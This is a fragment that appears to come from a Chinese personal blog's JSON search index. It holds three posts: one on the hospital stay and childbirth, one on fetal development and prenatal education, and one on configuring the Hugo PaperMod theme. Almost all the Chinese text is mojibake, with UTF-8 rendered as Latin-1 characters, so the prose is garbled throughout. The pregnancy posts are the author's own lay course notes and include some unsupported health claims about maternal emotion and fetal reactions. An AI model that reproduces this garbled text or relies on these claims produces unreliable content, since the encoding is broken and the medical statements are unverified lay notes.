æ‰€æœ‰ä¿¡æ¯å‡†ç¡®æ— è¯¯çš„å¡«å†™ æ–°ç”Ÿå„¿ç–¾ç—…ç­›æŸ¥ï¼Œéœ€äºŒç»´ç å¡«å†™ï¼ˆäº§åç—…æˆ¿å‘æ”¾ï¼‰ æ–°ç”Ÿå„¿ç–¾ç—…ç­›æŸ¥æŠ¥å‘Š\nå¼‚å¸¸æŠ¥å‘Šï¼šå„¿ç«¥åŒ»é™¢æ–°ç”Ÿå„¿ç–¾ç—…ç­›æŸ¥ä¸­å¿ƒï¼ŒçŸ­ä¿¡é€šçŸ¥ æ­£å¸¸æŠ¥å‘Šï¼šè‡ªåŠ©æŸ¥è¯¢ 4.3 å‡†çˆ¸çˆ¸å®‰å…¨é™ªæŠ¤é¡»çŸ¥ é˜²çƒ«ä¼¤ã€é˜²è·Œå€’å’Œé˜²å åºŠ æ‹–é‹è¦æ³¨æ„é˜²æ»‘ï¼ˆä¸è¦ç©¿é…’åº—é‚£ç§ä¸€æ¬¡æ€§æ‹–é‹ï¼‰ï¼Œéœ€è¦æ—¶æ‹‰èµ·åºŠæ  ä¸è¦åœ¨å©´å„¿åºŠä¸Šæ–¹ï¼Œä¼ é€’ä»»ä½•ç‰©å“ï¼ˆå¦‚ï¼šçƒ­ç²¥ï¼‰ å¦ˆå¦ˆå¦‚å•æ—¶ï¼Œè¦æ³¨æ„é™ªä¼´ï¼Œé¦–æ¬¡å¦‚å•è¯·å‘¼å«æŠ¤å£«ã€‚ ä¸æ‹†é™¤å–æ¶ˆ å­©å­çš„é˜²ç›—é“ƒã€è…•å¸¦ï¼ŒåŠç‰Œä¸¢å¤±åŠæ—¶å‘ŠçŸ¥æŠ¤å£«ã€‚ æ³¨æ„å®å®åºŠæ ï¼š 5.å‡ºé™¢ç¯‡ 5.1 å‡ºé™¢æ‰‹ç»­å’Œæ¯å©´æ‰‹å†Œ 5.2 å‡ºç”ŸåŒ»å­¦è¯æ˜ æ³¨æ„ï¼š\néœ€æŸ¥è¯¢ã€ç½‘ç»œæµç¨‹ã€‘å’Œã€ç°åœºåŠç†è¦æ±‚ã€‘ã€‚ä¸€æ—¦çº¿ä¸‹åŠç†äº†ã€å‡ºç”Ÿè¯æ˜ã€‘ï¼Œåˆ™å‰©ä¸‹çš„æµç¨‹éœ€è¦å…¨éƒ¨èµ°çº¿ä¸‹æµç¨‹ã€‚ ã€å®å®åå­—ã€‘ä¸€å®šè¦å¤šæ¬¡ç¡®è®¤ï¼Œä¸€ç»æ‰“å°ï¼ŒåŒ»é™¢ä¸å¯æ›´æ”¹å’Œæ›¿æ¢ 6.äº§ååŠç†ç›¸å…³äº‹å®œ å‡ºç”ŸåŒ»å­¦è¯æ˜ å©´å„¿æˆ·å£ç”³æŠ¥ å°‘å„¿åŒ»ä¿å¡ ç”Ÿè‚²ä¿é™©å¾…é‡ç”³é¢† æ³¨æ„ï¼šæ˜¯å¦å¯ä»¥ã€ç½‘ç»œåŠç†ã€‘ï¼Œéœ€è¦æŸ¥è¯¢æ”¯æŒçš„æ¡ä»¶\nä¸Šæµ·å…¬å®‰äººå£ç®¡ç†å®˜æ–¹ shgarkb\näºŒã€åˆ†å¨© 1.åˆ†å¨©å‡†å¤‡ ä¸´è¿‘åˆ†å¨©: åšå¥½å…¥é™¢å‡†å¤‡ï¼Œå‡†çˆ¶æ¯ä¸€èµ·å­¦ä¹ ä¸´äº§çŸ¥è¯† æ³¨æ„ç»§ç»­åšå¥½è‡ªæˆ‘ç›‘æŠ¤ï¼Œæ•°èƒåŠ¨ å­•æ™šæœŸ: æ§åˆ¶ä½“é‡ï¼Œä¸€å‘¨å¢åŠ å°äº500å…‹ã€‚ç»ƒå¥½ä½“åŠ›ï¼Œç»ƒå¥½å‘¼å¸ åˆ†å¨©çš„ç›¸å…³å› ç´ ï¼š 2.äº§ç¨‹ èƒå„¿å¨©å‡ºäº§é“çš„è¿‡ç¨‹: ç¬¬ä¸€äº§ç¨‹: ä¸´äº§åˆ°å®«å£å¼€å…¨ ç¬¬äºŒäº§ç¨‹: å®«å£å¼€å…¨åˆ°èƒå„¿å¨©å‡º ç¬¬ä¸‰äº§ç¨‹: èƒå„¿å¨©å‡ºååˆ°èƒç›˜èƒè†œå¨©å‡º 2.1 ç¬¬ä¸€äº§ç¨‹ ç¬¬ä¸€äº§ç¨‹åˆç§°ä¸ºå®«é¢ˆæ‰©å¼ æœŸã€‚ä»å¼€å§‹å‡ºç°å®«ç¼©ä¸´äº§ç›´è‡³å®«å£å¼€å…¨ï¼ˆ10å˜ç±³ï¼‰ä¸ºæ­¢ã€‚\nç¬¬ä¸€äº§ç¨‹å¯åˆ†ä¸ºä¸¤ä¸ªé˜¶æ®µï¼šæ½œä¼æœŸå’Œæ´»è·ƒæœŸã€‚\nå‡†å¦ˆå¦ˆè¯¥æ€ä¹ˆåš?\nä¿æŒç²¾ç¥æ„‰æ‚¦å’Œæ”¾æ¾ï¼Œæ­£ç¡®å‘¼å¸å¾ˆé‡è¦ï¼ äº§ç¨‹ä¸­å¤šè¿›é£ŸåŠæµè´¨é£Ÿç‰©ï¼Œå¤šè¿›æ°´ï¼ˆå‡†å¤‡ å¼¯å¤´å¸ç®¡ï¼‰ã€‚ å¤šæ´»åŠ¨ï¼Œå‹¤æ’å°¿ï¼Œåˆ©ç”¨ä½“ä½åŠ é€Ÿäº§ç¨‹ã€‚å…‹æœç„¦è™‘ã€ææƒ§ï¼Œé‡‡ç”¨å¤šç§æ”¾æ¾æ–¹æ³•ã€‚ äº§æ—¶é¥®é£ŸæŒ‡å¯¼ï¼š\nå»ºè®®å‡†å¤‡çš„é¥®æ–™ï¼šç”µè§£è´¨é¥®æ–™ï¼Œè¿åŠ¨å‹é¥®æ–™ï¼Œæ©™æ±ï¼ˆå¸¸æ¸©ä¿å­˜ï¼‰ å»ºè®®å‡†å¤‡çš„é£Ÿç‰©ï¼šå¯å¸¸æ¸©ä¿å­˜çš„è›‹ç³•é¢åŒ…ç­‰è½¯é£Ÿï¼ˆå¿«é€Ÿè¡¥å……ç³–åˆ†å’Œèƒ½é‡ï¼‰ï¼Œå¯çƒ­æ°´å†²æ³¡çš„èŠéº»ç³Šã€è—•ç²‰å’Œè±†å¥¶ç²‰ç­‰ï¼Œè½¯ç³¯å®¹æ¶ˆåŒ–çš„é¦™è•‰æ°´æœç­‰ ä¸å»ºè®®å‡†å¤‡: çº¢ç‰›ï¼Œå·§å…‹åŠ›ï¼Œäººå‚ï¼ˆç²‰ï¼‰ï¼Œæ¡‚åœ†ï¼Œçº¢ç³–ï¼Œå¥¶èŒ¶ç­‰ 2.2 ç¬¬äºŒäº§ç¨‹ ç¬¬äºŒäº§ç¨‹ï¼Œåˆç§°èƒå„¿å¨©å‡ºæœŸã€‚ä»å®«å£å¼€å…¨åˆ°èƒå„¿å¨©å‡ºçš„å…¨è¿‡ç¨‹ã€‚åˆäº§å¦‡éœ€è¦3-4å°æ—¶ï¼Œç»äº§å¦‡2-3å°æ—¶å®Œæˆã€‚\næ•´ä¸ªè¿‡ç¨‹ä¼´éšï¼šå­å®«æ”¶ç¼©å¢å¼ºã€èƒå„¿ä¸‹é™åŠå¨©å‡ºã€ç–¼ç—›ä¸æ’ä¾¿æ„Ÿ\nå‡†å¦ˆå¦ˆè¯¥æ€ä¹ˆåšï¼Ÿ\nåˆé€‚ä½“ä½ã€‚ æ§åˆ¶å¥½å‘¼å¸ï¼Œæ­£ç¡®å±æ°”ã€‚ é™ªäº§äººå‘˜æ³¨æ„å…¨ç¨‹é¼“åŠ±ï¼ˆæ­£èƒ½é‡ï¼‰ å‡†çˆ¸çˆ¸ï¼Œæ‚¨è¯¥æ€ä¹ˆåšï¼Ÿ ç»™äºˆå‡†å¦ˆå¦ˆç²¾ç¥å’Œæƒ…æ„Ÿä¸Šçš„æ”¯æŒ æé†’å‡†å¦ˆå¦ˆæ”¾è½»æ¾ï¼Œè°ƒæ•´å¥½å‘¼å¸ å¸®åŠ©å¥¹æŒ‰æ‘©èƒŒéƒ¨ã€æ“¦æ±—ã€å–‚æ°´ è¦å¤šè¯´äº›é¼“åŠ±å’Œèµæ‰¬çš„è¯ï¼Œè®©å‡†å¦ˆå¦ˆæœ‰ä¿¡å¿ƒåšæŒåˆ°åº• å‹æƒ…æç¤ºï¼šè¯·ç»§ç»­ç£ä¿ƒå¦ˆå¦ˆå®Œæˆæ•°èƒåŠ¨çš„å›å®¶ä½œä¸š 2.3 ç¬¬ä¸‰äº§ç¨‹ ç¬¬ä¸‰äº§ç¨‹ åˆç§°èƒç›˜å¨©å‡ºæœŸã€‚ä»èƒå„¿å¨©å‡ºååˆ°èƒç›˜èƒè†œå¨©å‡ºï¼Œå³èƒç›˜å‰¥ç¦»å’Œå¨©å‡ºçš„å…¨è¿‡ç¨‹ï¼Œéœ€è¦5-10åˆ†é’Ÿï¼Œä¸€èˆ¬ä¸è¶…è¿‡30åˆ†é’Ÿã€‚\næ—©å¸å®ï¼Œæ—©æ¥è§¦ï¼Œæ—©å¼€å¥¶ ä¼šé˜´ä¾§åˆ‡ï¼ˆæŒ‡å¾ï¼‰ äº§åè§‚å¯Ÿ2å°æ—¶ï¼Œç”Ÿå‘½ä½“å¾ç›‘æµ‹ 3.åˆ†å¨©é•‡ç—›æ”»ç•¥ äº§å¦‡éœ€æ±‚ã€äº§æˆ¿åŒ»ç”Ÿã€éº»é†‰å¸ˆã€åŠ©äº§å£«ï¼š\nç­¾ç½²â€œåˆ†å¨©é•‡ç—›çŸ¥æƒ…åŒæ„ä¹¦â€ å®«å£å¼€å¤§2~3cmæ—¶å¸¸è§„è¡Œé˜´é“æ£€æŸ¥ äº§ç¨‹è¿›å±•ç†æƒ³ï¼Œæ— éº»é†‰ç¦å¿Œç—‡ æŒç»­ç›‘æµ‹èƒå¿ƒç›´è‡³èƒå„¿å¨©å‡º 4.é¢„é˜²â€œè‰¾æ¢…ä¹™â€æ¯å©´ä¼ æ’­ ä¹™è‚ç—…æ¯’æ„ŸæŸ“ã€æ¢…æ¯’æ„ŸæŸ“å’ŒHIVæ„ŸæŸ“ç­‰ï¼Œå…·ä½“å’¨è¯¢ä¸´åºŠåŒ»ç”ŸéµåŒ»å˜±ã€‚ ä¹™è‚ç—…æ¯’æºå¸¦è€…ï¼šå©´å„¿å‡ºç”Ÿåï¼Œæ¥ç§ä¹™è‚ç–«è‹—ã€ä¹™è‚å…ç–«çƒè›‹ç™½ï¼ˆ24å°æ—¶ï¼‰ æ³¨æ„ï¼šæ­¤ç¬”è®°ä»…ä¾›ä½œè€…è‡ªèº«è®°å½•ä½¿ç”¨ï¼Œä¸“ä¸šæ€§é—®é¢˜è¯·è”ç³»ä¸“ä¸šçš„å¦‡å¹¼åŒ»ç”Ÿï¼Œè¯·å‹¿å•†ç”¨ï¼ç‰ˆæƒç›¸å…³åŠè¯¾ç¨‹æˆæƒï¼Œè¯·è”ç³»ã€ä¸Šæµ·å¸‚é•¿å®å¦‡å¹¼ä¿å¥é™¢ã€‘ï¼\næœ€åï¼Œ å¸Œæœ›å„ä½å‡†çˆ¸çˆ¸ä»¬ï¼Œä¸€å®šè¦ä¼˜å…ˆç…§é¡¾å¥½å‡†å¦ˆå¦ˆï¼Œå¥¹å†’ç€å·¨å¤§çš„é£é™©å¸¦ç€ä½ ä»¬çš„å®å®æ¥åˆ°è¿™ä¸ªä¸–ç•Œï¼ æ¬¢è¿äº¤æµ~\n","permalink":"https://lianpf.github.io/posts/other/pregnancy-accompany-and-childbirth/","summary":"åˆä¸ºäººçˆ¶ï¼Œæ˜¯ä¸€æ®µä»¤äººæ¬£å–œä½†ä¹Ÿå®¹æ˜“ä¸åšæ‰€é”™çš„é˜¶æ®µã€‚è¿™é‡Œè®°å½•äº†ä¸€","title":"å­•æœŸ: ä½é™¢é™ªæŠ¤æ”»ç•¥å’Œåˆ†å¨©"},{"content":"åˆä¸ºäººçˆ¶ï¼Œæ˜¯ä¸€æ®µä»¤äººæ¬£å–œä½†ä¹Ÿå®¹æ˜“ä¸åšæ‰€é”™çš„é˜¶æ®µã€‚è¿™é‡Œè¿™é‡Œè®°å½•äº†ä¸€äº›ï¼Œåœ¨å­•æœŸä¸­å¯¹äºåª³å¦‡å„¿å’Œå®å®ç›¸å…³çš„æ³¨æ„äº‹é¡¹\u0026hellip;\næœ¬æ–‡æ˜¯ã€å­•æœŸç³»åˆ—ã€‘çš„ç¬¬1ç¯‡ ã€Šå­•æœŸ: å¯¹äºå‡†å¦ˆå¦ˆå’Œå®å®çš„æ³¨æ„äº‹é¡¹ã€‹ï¼Œæœ¬ç³»åˆ—å…¶ä»–æ–‡ç« ï¼š\næœ€å1ç¯‡ ã€Šå­•æœŸ: ä½é™¢é™ªæŠ¤æ”»ç•¥å’Œåˆ†å¨©ã€‹ ä¸€ã€èƒŒæ™¯ 1.å­•æœŸï¼ˆå®å®å‘è‚²è¿‡ç¨‹ï¼‰ å­•æ—©æœŸï¼ˆå®å®æˆå‹æœŸï¼‰ï¼šå‘¨æ•°æ˜¯1~12å‘¨ï¼ˆæœˆä»½æ•°æ˜¯1-3æœˆï¼‰ ä»æ’åµåˆ°ç²¾å­åµå­ç»“åˆï¼Œå†åˆ°èƒšèƒå‘è‚²æˆå®å®ã€‚å®å®å™¨å®˜å’Œå¤–è²ŒåŸºæœ¬å½¢æˆï¼Œå·²åˆå…·äººå½¢ å­•ä¸­æœŸï¼ˆå®å®æˆé•¿æœŸ-å®å®å‘è‚²è¦ç‚¹ï¼‰ï¼šå‘¨æ•°æ˜¯13~25å‘¨ï¼ˆæœˆä»½æ•°æ˜¯4-6.5æœˆï¼‰ å®å®å¤§è„‘ã€éª¨éª¼ã€å†…è„ç­‰å™¨å®˜ç»„ç»‡è¿›ä¸€æ­¥å‘è‚²ï¼Œå®å®è¿…é€Ÿæˆé•¿ å­•æ™šæœŸï¼ˆå®å®å‘è‚²æœŸï¼‰ï¼šå‘¨æ•°æ˜¯26~40å‘¨ï¼ˆæœˆä»½æ•°æ˜¯6.5-10æœˆï¼‰ å®å®å°†å®Œå–„å„å™¨å®˜ï¼Œæ¯”å¦‚çš®è‚¤é•¿å¾—æ›´åšå®äº†ï¼Œçš®ä¸‹è„‚è‚ªé€æ¸å¢åŠ ;å®å®å‘¼å¸ç³»ç»Ÿæ›´åŠ å¥å…¨ï¼Œå¤§è„‘ç¥ç»ç³»ç»Ÿä¸æ–­å®Œå–„ã€‚å„å™¨å®˜ä¹Ÿä¼šå…·æœ‰å…¶ç›¸å¯¹åº”çš„åŠŸèƒ½ï¼Œä¸ºå‡ºç”Ÿååšå¥½å……åˆ†å‡†å¤‡ è¶³æœˆ: å¦Šå¨ 38ï½42å‘¨å†…åˆ†å¨© 1.1 å­•æ—©æœŸ 3å‘¨+3ï¼ˆ24å¤©ï¼‰ï¼šå¿ƒè„å¼€å§‹è·³åŠ¨ 5å‘¨ï¼š9æ¯«ç±³é•¿ï¼Œé¢éƒ¨å‘è‚²éšçº¦å¯è§é¼»å­å’Œå˜´ 5å‘¨+5ï¼ˆ40å¤©ï¼‰: èƒç›˜å’Œèƒšèƒï¼Œè¢«è„å¸¦è¿æ¥ 6å‘¨ï¼šå¯çœ‹åˆ°å®å®çš„è„Š 7å‘¨ï¼šéšçº¦å¯è§å®å®äººå½¢ 8å‘¨ï¼šåœ¨èƒå›Šä¸­ï¼Œå¿«é€Ÿå‘è‚² 1.2 å­•ä¸­æœŸ 16å‘¨: å®å®ç”Ÿæ®–å™¨å®˜å·²å½¢æˆ 17å‘¨ï¼šå®å®çœ¼çš®å·²å½¢æˆã€‚ä½†ç´§é—­ç€ï¼Œç›´åˆ°24å‘¨æ‰ä¼šçå¼€ 20å‘¨ï¼šå®å®é•¿çº¦20cmã€‚å­¦ä¼šå®å¸ï¼Œå¼€å§‹èƒ½åå’½ç¾Šæ°´ 24å‘¨ï¼šå¬åŠ›å·²ç»å½¢æˆï¼Œæœ‰ç»†å¾®è¡¨æƒ… 1.3 å­•åæœŸ 26å‘¨: å°å®¶ä¼™èœ·æ›²åœ¨å­å®«é‡Œï¼Œè¿™ä¸ªç©ºé—´æ˜¾å¾—æœ‰ç‚¹å„¿å°äº† 36å‘¨: å…¨èº«å™¨å®˜åŠŸèƒ½å®Œå–„ï¼Œå®å®è¶Šæ¥è¶Šèƒ– 37å‘¨ï¼šèƒè„‚å‡å°‘ï¼Œèƒå¤´ä¸‹é™ 2.å®å®çš„å˜åŒ–ï¼ˆè„‘ã€å¬/è§†/è§¦/å‘³è§‰ï¼‰ å®å®è„‘çš„å˜åŒ–\n2-3æœˆï¼šç¥ç»ç®¡é¼“èµ·ï¼Œå¤§è„‘è¿…é€Ÿå‘è‚²ã€‚è„‘å’Œå»¶é«“åˆ†æ˜ 4-5æœˆï¼šç¥ç»å…ƒå¢å¤šï¼Œç¥ç»çªå‡ºå½¢æˆã€‚è¡¨çš®æœªè¤¶çš± 6-7æœˆï¼šè„‘cåˆ†åŒ–ï¼Œæ¥è¿‘æˆäººè„‘æ„é€  8-9æœˆï¼šè„‘å‘è‚²å®Œæˆï¼Œè¤¶çš±åŸºæœ¬å½¢æˆ 10æœˆï¼šè„‘é‡é‡400gï¼Œç¥ç»c 1000äº¿ å®å®å¬è§‰: ä¾èµ–æ¯äº²çš„å¿ƒéŸ³\n4å‘¨ï¼šå¬è§‰å™¨å®˜å·²ç»å‘è‚² 25å‘¨ï¼šä¼ éŸ³ç³»ç»ŸåŸºæœ¬å‘è‚²å®Œæˆ 28å‘¨ï¼šå¯ä»¥å‘ç”Ÿå¬è§‰ååº” å®å®è§†è§‰: 17å‘¨ï¼ˆ4ä¸ªæœˆï¼‰ï¼Œå¼€å§‹å¯¹å…‰çº¿å°±éå¸¸æ•æ„Ÿ\nå®å®è§¦è§‰\nå®å®è§¦è§‰å‡ºç°å¾ˆæ—©ï¼Œç”±äºå­å®«é»‘æš—ï¼Œæ‰€ä»¥å®å®çš„è§¦è§‰å’Œå¬è§‰éå¸¸å‘è¾¾ å¦Šå¨ 2ä¸ªæœˆï¼šå®å®å°±èƒ½æ‰­åŠ¨å¤´éƒ¨ã€å››è‚¢å’Œèº«ä½“ å®å®å‘³è§‰: å‘³è•¾åœ¨å¦Šå¨ 3ä¸ªæœˆæ—¶é€æ­¥å½¢æˆï¼Œ7ä¸ªæœˆå·²å¤§è‡´å®Œæˆï¼Œå¯¹ç”œå‘³å’Œè‹¦å‘³æ•æ„Ÿ\näºŒã€è®¤è¯†èƒæ•™ï¼ˆæ„ç­‘å®å®èªæ˜å¤´è„‘ï¼‰ å‡†å¦ˆå¦ˆçš„è°ƒæ•´:\nç¯å¢ƒèƒæ•™ è¥å…»èƒæ•™ é€‚å½“è¿åŠ¨ æƒ…ç»ªèƒæ•™: æ„‰å¿«çš„å¿ƒæƒ… å®¶äººçš„å…³çˆ± å±•æœ›ç¾å¥½æœªæ¥ 1.ç¯å¢ƒèƒæ•™ å±…å®¶ç¯å¢ƒ æ–°å±…è£…ä¿®å®Œæ¯•ï¼Œå»ºè®®åŠå¹´åå…¥ä½ï¼ˆåšæœ‰å®³ç‰©è´¨æ£€æµ‹ï¼‰ æ–°è´­ç½®çš„å„¿ç«¥è¡£ç‰©ç©å…·çš„æ©±æŸœï¼Œæè´¨é€‰æ‹©æ— æ¯’ï¼Œä¸”å®¹æ˜“æ¸…æ´—çš„æè´¨ï¼Œåšå¥½é€šé£ï¼Œè®©æœ‰å®³ç‰©è´¨å……åˆ†æŒ¥å‘ å®¤å†…ä¸å»ºè®®ä½¿ç”¨çº¯æ¯›åœ°æ¯¯ï¼ˆå¦‚æœä½¿ç”¨è¯·åŠæ—¶æ¶ˆæ¯’ï¼Œå¹¶é€šé£ï¼‰ äºŒæ‰‹çƒŸï¼šå­•æœŸå‡å°‘è¢«åŠ¨å¸çƒŸçš„æœºä¼š æ³¨æ„å«ç”Ÿï¼šé¿å…ç»™çŒ«ç‹—åƒç”Ÿè‚‰ï¼Œé¿å…ç›´æ¥æ¥è§¦çŒ«ç‹—çš„ç²ªä¾¿ï¼ˆå­•æœŸæœ€å¥½ä¸è¦æ¥è§¦çŒ«ç‹—ï¼‰ äºŒæ‰‹çƒŸï¼Œå¯¹å­•å¦‡å’Œå®å®æœ‰å“ªäº›å±å®³å‘¢ï¼Ÿ\nå¯¹å­•å¦‡çš„å±å®³ å¦Šå¨ ç»¼åˆç—‡ï¼šé«˜è¡€å‹ã€é«˜è¡€ç³–ç­‰ å­•æœŸè‡´ç™Œï¼šåŸºå› çªå˜ï¼Œå¯¼è‡´è‚¿ç˜¤å‘ç”Ÿ æŠµæŠ—åŠ›ä¸‹é™ï¼šæ›´æ˜“æ„Ÿå†’ã€å¤´ç—› å¯¹å®å®çš„å½±å“ å®å®å‘è‚²ä¸è‰¯ï¼Œå®å®ç•¸å½¢ï¼Œç”šè‡³æ˜¯æ­»èƒ å©´å„¿çŒæ­»ç»¼åˆç—‡ã€æ—©äº§ã€æ–°ç”Ÿå„¿ç¥ç»ç®¡ç•¸å½¢å’Œå”‡è…­è£‚ç­‰é£é™©ä¸Šå‡ 2.æƒ…ç»ªèƒæ•™ï¼šä¿æŒæ„‰æ‚¦çš„å¿ƒæƒ… æƒ…ç»ªèƒæ•™ï¼šå®å®ä¸¤ä¸‰ä¸ªæœˆå°±å¯ä»¥æ„Ÿå—åˆ°å¦ˆå¦ˆçš„æƒ…ç»ªï¼Œä¼šå½±å“åˆ°ç¥ç»ç³»ç»Ÿå‘è‚²ç»“æ„å’Œæ”¹å˜DNAç³–çš®è´¨æ¿€ç´ å—ä½“ç»“æ„ï¼Œæ‰€ä»¥å‡†å¦ˆå¦ˆä¸€å®šè¦å¿ƒæƒ…æ„‰æ‚¦ï¼Œé‡è§†äº§æ£€å¸¸è§„å¿ƒç†é—¨è¯Šï¼ˆæ—©å‘ç°ï¼Œæ—©å¹²é¢„ï¼‰ å®å®èƒ½ç†è§£å¦ˆå¦ˆçš„æ„Ÿæƒ…ï¼šå½“æ¯äº²æƒ…ç»ªå˜åŒ–æ—¶ï¼Œç¥ç»ç³»ç»Ÿåˆ†æ³Œçš„æ¿€ç´ ä¼šéšè¡€æ¶²ç»èƒç›˜è¿›å…¥å®å®ä½“å†…ï¼Œä½¿å®å®äº§ç”Ÿä¸å‡†å¦ˆå¦ˆä¸€æ ·çš„æƒ…ç»ªç‰¹å¾ å¦ˆå¦ˆæƒŠæ…Œå¤±æªï¼Œå®å®ä¼šå…¨èº«æŠ½æ å¦ˆå¦ˆé—·é—·ä¸ä¹æ—¶ï¼Œå¹³æ—¶æ´»è·ƒçš„å®å®ä¹Ÿä¸åŠ¨äº† å¦‚ä½•ä¿æŒæ„‰æ‚¦çš„å¿ƒæƒ…ï¼Ÿ\nåšè‡ªå·±å–œæ¬¢åšçš„äº‹æƒ… çœ‹å–œå‰§ç”µå½±å’Œå¹½é»˜ç”»æŠ¥ï¼ˆä¸å»ºè®®å­•å¦‡å‰å¾€ç”µå½±é™¢å’ŒKTVç¯å¢ƒï¼‰ å‡†çˆ¸çˆ¸è¦ä½“è´´ å¸¸æ‰¾æœ‹å‹å€¾è¯‰ è®°æ—¥è®°æˆ–å†™åšå®¢ å¸¸åšæ”¾æ¾è®­ç»ƒ é€ƒç¦»çº·æ‰°çš„éƒ½å¸‚ 3.å¦‚ä½•æ­£ç¡®çš„èƒæ•™ï¼Ÿ èƒæ•™å§‹äºä¼˜å­•\nä»¥å®å®ä¸ºä¸­å¿ƒå®‰æ’ç”Ÿæ´» èƒæ•™çš„å…³é”®æ˜¯ å‡†å¦ˆå¦ˆçš„æƒ…ç»ªå’Œæ€åº¦ ä¸ºèƒæ•™åˆ›é€ å¥½çš„ç¯å¢ƒ å‡†çˆ¸çˆ¸æ˜¯å‚ä¸èƒæ•™ä¸å¯ç¼ºå°‘çš„ç¯èŠ‚ â€œå­å®«å¯¹è¯â€ï¼šå¤šå’Œå®å®æ²Ÿé€šï¼›å……æ»¡æ„Ÿæƒ…è‰²å½©çš„ç»™å®å®è®²æ•…äº‹ ç»™å®å®ä»¥éŸ³ä¹çš„ç†é™¶ æ¯æ¬¡èƒæ•™å‰ï¼Œç»ƒä¹ ä¸€ä¸‹ã€å‘¼å¸æ³•ã€‘å¹³é™å¿ƒæƒ… å‘¼å¸æ³•: è‡ªæˆ‘æ”¾æ¾è®­ç»ƒï¼ˆç»ƒä¹ æ—¶ï¼Œç€å®½æ¾è¿åŠ¨å‹è¡£ç‰©ï¼‰\né‡‡å–èˆ’é€‚ã€è‡ªç„¶çš„æ–¹å¼ååœ¨æ¤…å­ä¸Šæˆ–èººåœ¨åºŠä¸Š è…°èƒŒèˆ’å±•ï¼Œå…¨èº«æ”¾æ¾ï¼Œå¾®é—­çœ¼ç›ï¼Œç¼“æ…¢æ·±å‘¼å¸ æ³¨æ„ï¼šæ­¤ç¬”è®°ä»…ä¾›ä½œè€…è‡ªèº«è®°å½•ä½¿ç”¨ï¼Œä¸“ä¸šæ€§é—®é¢˜è¯·è”ç³»ä¸“ä¸šçš„å¦‡å¹¼åŒ»ç”Ÿï¼Œè¯·å‹¿å•†ç”¨ï¼ç‰ˆæƒç›¸å…³åŠè¯¾ç¨‹æˆæƒï¼Œè¯·è”ç³»ã€ä¸Šæµ·å¸‚é•¿å®å¦‡å¹¼ä¿å¥é™¢ã€‘ï¼\næœ€åï¼Œ å¸Œæœ›å„ä½å‡†çˆ¸çˆ¸ä»¬ï¼Œä¸€å®šè¦ä¼˜å…ˆç…§é¡¾å¥½å‡†å¦ˆå¦ˆï¼Œå¥¹å†’ç€å·¨å¤§çš„é£é™©å¸¦ç€ä½ ä»¬çš„å®å®æ¥åˆ°è¿™ä¸ªä¸–ç•Œï¼ æ¬¢è¿äº¤æµ~\n","permalink":"https://lianpf.github.io/posts/other/pregnancy-attention/","summary":"\u003cp\u003eåˆä¸ºäººçˆ¶ï¼Œæ˜¯ä¸€æ®µä»¤äººæ¬£å–œä½†ä¹Ÿå®¹æ˜“ä¸åšæ‰€é”™çš„é˜¶æ®µã€‚è¿™é‡Œè¿™é‡Œè®°å½•äº†ä¸€äº›ï¼Œåœ¨å­•æœŸä¸­å¯¹äºåª³å¦‡å„¿å’Œå®å®ç›¸å…³çš„æ³¨æ„äº‹é¡¹\u0026hellip;\u003c/p\u003e","title":"å­•æœŸ: èƒŒæ™¯çŸ¥è¯†å’Œèƒæ•™"},{"content":"Hugoåšå®¢ä¸­çš„å®˜æ–¹å¯¼èˆªæ æ˜¯å¤´éƒ¨çš„ï¼Œä¹‹å‰ä½¿ç”¨çš„Mainroadä¸»é¢˜ä¹Ÿæ˜¯å¦‚æ­¤ï¼ˆä¸”ä¸å¤ªå¥½è‡ªå®šä¹‰åˆ°å·¦ä¾§ï¼‰ã€‚æ—¥å¸¸æ–‡æ¡£é˜…è¯»ä¸­ï¼Œä¾§è¾¹tocæ›´ä¸ºæ–¹ä¾¿ï¼Œæ•…å¯¹ä¸»é¢˜åšäº†å‡çº§\u0026hellip;\nä¸€ã€Papermod ä¸»é¢˜é…ç½® å®˜æ–¹ä¸»é¢˜ä»“åº“: https://github.com/adityatelange/hugo-PaperMod é¡¹ç›®åˆå§‹åŒ–ï¼š\n$ cd Blogs # è¿›å…¥åšå®¢é¡¹ç›® $ git submodule update --init # æ‹‰å–themes/hugo-PaperMod/ä¸‹çš„å­æ¨¡å—ï¼Œé‡Œé¢æ”¾çš„æ˜¯å®˜æ–¹ä¸»é¢˜ ä¿®æ”¹config.ymlæ ¸å¿ƒé…ç½®:\n... theme: hugo-PaperMod # ä¸»é¢˜åå­—ï¼Œå’Œthemesæ–‡ä»¶å¤¹ä¸‹çš„ä¸€è‡´ ... menu: main: - identifier: search name: ğŸ” æœç´¢ url: search weight: 1 - identifier: home name: ğŸ  ä¸»é¡µ url: / weight: 2 - identifier: tags name: ğŸ§© æ ‡ç­¾ url: tags weight: 15 - identifier: archives name: â±ï¸ å½’æ¡£ url: archives/ weight: 3 - identifier: about name: ğŸ™‹ğŸ»â€â™‚ï¸ å…³äº url: about weight: 50 outputs: home: - HTML - RSS - JSON # è¿™é‡Œçš„å‚æ•°ä¼šè¢«ä»£ç ä»¥ .Site.Params çš„å½¢å¼è¯»å– params: ... defaultTheme: dark # defaultTheme: light or dark or auto disableThemeToggle: false DateFormat: \u0026#34;2006-01-02\u0026#34; ... profileMode: ... subtitle: ğŸŒ å¸¦ç€ \u0026#34;åè§\u0026#34; å»ç†è§£æŠ€æœ¯çš„ä¸–ç•Œ imageUrl: \u0026#34;img-common/avatar.jpeg\u0026#34; ... buttons: - name: ğŸ“• è®¡ç®—æœºåŸºç¡€ url: posts/computer-basics - name: ğŸ‘¨ğŸ»â€ğŸ’» å‰ç«¯å¼€å‘ url: posts/frontend-develop - name: ğŸ§± åç«¯å¼€å‘ url: posts/backend-develop - name: ğŸ– å…¶ä»– url: posts/other socialIcons: - name: github url: \u0026#34;https://github.com/lianpf\u0026#34; - name: çŸ¥ä¹ # url: \u0026#34;zhihu.svg\u0026#34; url: \u0026#34;https://www.zhihu.com/people/lianpf-sun/posts\u0026#34; - name: email url: \u0026#34;mailto:wanderlian@outlook.com\u0026#34; - name: RSS url: \u0026#34;index.xml\u0026#34; ... StartYear: 2016 # åº•éƒ¨å¼€å§‹å¹´ä»½ ... æ›´å¤šä¸ªäººä¿¡æ¯é…ç½®ï¼Œè¯·å‚è€ƒå»ºç«™æ•™ç¨‹ï¼šhttps://www.sulvblog.cn/posts/blog/\nåœ¨ç»ˆç«¯è¾“å…¥hugo server -Dï¼Œåœ¨æµè§ˆå™¨è¾“å…¥ï¼šlocalhost:1313 å³å¯çœ‹åˆ°\näºŒã€æ³¨æ„äº‹é¡¹ 